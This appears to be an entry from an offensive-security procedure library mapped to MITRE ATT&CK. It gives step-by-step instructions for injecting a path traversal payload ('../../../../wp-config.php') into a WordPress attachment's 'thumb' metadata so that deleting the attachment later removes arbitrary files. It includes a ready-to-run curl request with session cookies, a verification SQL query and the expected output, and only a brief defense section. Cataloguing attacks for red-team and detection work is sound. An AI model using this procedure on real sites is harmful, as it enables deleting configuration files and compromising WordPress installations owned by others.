---
id: proc-inject-path-traversal-metadata
tags:
  - path-traversal
  - wordpress
  - metadata-injection
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-update-wordpress-attachment-metadata]]'
verified: false
platforms:
  - Web
  - WordPress
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:24:56.524Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Inject-Path-Traversal-Payload-into-Attachment-Metadata

## Summary

This procedure exploits the lack of sanitization in WordPress attachment editing to inject a path traversal payload into the 'thumb' metadata field, storing it directly in the database for later use in file path construction during deletion.

## Description

Targeting the wp-admin/post.php editattachment action, this procedure sends unsanitized input via the 'thumb' POST parameter, updating _wp_attachment_metadata without validation. The payload, such as '../../../../wp-config.php', allows traversal beyond the uploads directory when processed in wp_delete_attachment. Requires knowledge of the attachment post ID and CSRF nonce from the edit form; outcomes include database persistence of the malicious path, enabling arbitrary deletion on attachment removal.

## Requirements

1. Attachment post ID from prior upload
2. Valid _wpnonce from the editattachment form
3. Authenticated session cookies for admin access
4. curl tool for POST request simulation

## Defense

Defensive measures and detection strategies:

- Implement input sanitization for metadata fields using wp_check_filetype or path validation
- Log and alert on POST requests to editattachment with suspicious 'thumb' values
- Use database triggers to scan postmeta updates for traversal patterns like '../'

## Objectives

1. Update attachment metadata with traversal payload
2. Bypass direct insertion into database
3. Set up for file deletion exploitation

## Instructions

### Step 1: Extract Post ID and Nonce

**Context**: Gather necessary identifiers from the WordPress interface.

From the Media Library, click Edit on the attachment to load wp-admin/post.php?post=[ID]&action=edit. View source or inspect form to copy _wpnonce value.

### Step 2: Submit Malicious Edit Request

**Context**: Use curl to POST the payload, mimicking an authenticated user.

Execute [[commands/curl-update-wordpress-attachment-metadata]] with site-specific values:

```bash
curl 'http://target.com/wp-admin/post.php?post=123&action=editattachment&_wpnonce=abc123' -H 'User-Agent: Mozilla/5.0 (compatible; Attacker/1.0)' -H 'Cookie: wordpress_logged_in_abc=valid_token' -d 'thumb=../../../../wp-config.php' --compressed
```

> This command updates the database with the unsanitized thumb path; expect a redirect or 200 response indicating success.

### Step 3: Verify Injection

**Context**: Confirm the payload is stored.

Re-edit the attachment or query the database (SELECT meta_value FROM wp_postmeta WHERE meta_key='_wp_attachment_metadata' AND post_id=123) to check for the injected 'thumb' value.

**Expected Output**: Metadata JSON includes {"thumb":"../../../../wp-config.php"}.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-update-wordpress-attachment-metadata]]

## Tools Used

- [[tools/curl]]

## Tags

- path-traversal
- wordpress
- metadata-injection
